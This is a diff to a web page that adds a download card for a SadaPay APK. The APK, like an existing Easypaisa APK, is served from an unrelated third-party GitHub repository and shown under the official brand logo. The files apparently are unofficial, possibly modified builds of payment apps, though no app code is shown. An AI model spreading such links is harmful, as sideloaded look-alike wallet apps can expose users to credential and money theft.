@@ -350,6 +350,16 @@
     border-bottom: 1px solid #F3F4F6;
   }
   .wallet-row:last-child { border-bottom: 0; }
+  /* SadaPay uses a horizontal wordmark, not a square app icon. */
+  .wlogo.wlogo-wide {
+    width: 1.72rem;
+    height: 0.72rem;
+    object-fit: contain;
+    border-radius: 0;
+    background: transparent;
+    box-shadow: none;
+  }
+
   .wlogo {
     width: 0.96rem;
     height: 0.96rem;
@@ -743,6 +753,19 @@
           </div>
         </div>
         <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/easypaisa_dp.apk" rel="noopener">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
+          <span data-i18n="mDownload"></span>
+        </a>
+      </div>
+      <div class="dl-card">
+        <div class="dl-card-top">
+          <img class="wlogo wlogo-wide" src="https://cdn.prod.website-files.com/64fb2014abe05eccc8b38932/65145ff65fa97ff938c3c46f_Full.webp" alt="SadaPay">
+          <div class="info">
+            <div class="name">SadaPay</div>
+            <div class="file">sadapay_dp.apk</div>
+          </div>
+        </div>
+        <a class="btn-dl" href="https://github.com/indiapay23/apk/releases/download/PK/sadapay_dp.apk" rel="noopener">
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 3v12"/><path d="m7 10 5 5 5-5"/><path d="M5 21h14"/></svg>
           <span data-i18n="mDownload"></span>
         </a>
